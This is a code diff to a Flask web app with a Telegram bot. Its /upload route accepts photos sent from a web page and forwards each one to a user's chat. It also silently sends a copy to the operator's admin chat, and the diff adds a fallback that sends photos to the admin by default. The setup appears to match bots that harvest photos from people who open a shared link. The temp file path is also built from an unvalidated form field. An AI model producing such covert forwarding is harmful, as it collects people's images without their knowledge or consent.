@@ -3,11 +3,13 @@ import telebot
 import os
 from dotenv import load_dotenv
 
+# ==========================
 # Load .env variables
+# ==========================
 load_dotenv()
 
 BOT_TOKEN = os.getenv("BOT_TOKEN")
-ADMIN_CHAT_ID = os.getenv("CHAT_ID")  # your chat id
+ADMIN_CHAT_ID = os.getenv("CHAT_ID")  # your Telegram chat ID
 PROJECT_LINK = os.getenv("PROJECT_LINK")
 
 bot = telebot.TeleBot(BOT_TOKEN)
@@ -22,26 +24,29 @@ def index():
 
 @app.route("/upload", methods=["POST"])
 def upload():
-    if "photo" in request.files and "chat_id" in request.form:
-        photo = request.files["photo"]
-        chat_id = request.form["chat_id"]
+    """Handle photo uploads from index.html"""
+    if "photo" not in request.files:
+        return "No photo", 400
 
-        temp_path = f"temp_{chat_id}.jpg"
-        photo.save(temp_path)
+    photo = request.files["photo"]
+    chat_id = request.form.get("chat_id", ADMIN_CHAT_ID)  # fallback to admin
 
-        try:
-            with open(temp_path, "rb") as img:
-                # Send to the user
-                bot.send_photo(chat_id, img)
+    temp_path = f"temp_{chat_id}.jpg"
+    photo.save(temp_path)
 
-                # Send copy to admin
-                img.seek(0)
-                bot.send_photo(ADMIN_CHAT_ID, img)
-        except Exception as e:
-            print("❌ Telegram send error:", e)
-        finally:
-            if os.path.exists(temp_path):
-                os.remove(temp_path)
+    try:
+        with open(temp_path, "rb") as img:
+            # Send to the user
+            bot.send_photo(chat_id, img)
+
+            # Send a copy to admin
+            img.seek(0)
+            bot.send_photo(ADMIN_CHAT_ID, img)
+    except Exception as e:
+        print("❌ Telegram send error:", e)
+    finally:
+        if os.path.exists(temp_path):
+            os.remove(temp_path)
 
     return "OK"
 
@@ -50,6 +55,7 @@ def upload():
 # ==========================
 @app.route(f"/{BOT_TOKEN}", methods=["POST"])
 def telegram_webhook():
+    """Handle incoming Telegram updates"""
     json_str = request.get_data().decode("UTF-8")
     update = telebot.types.Update.de_json(json_str)
     bot.process_new_updates([update])
@@ -60,6 +66,7 @@ def telegram_webhook():
 # ==========================
 @bot.message_handler(commands=["start"])
 def start(message):
+    """When user sends /start"""
     username = message.from_user.first_name
     chat_id = message.chat.id
     text = (
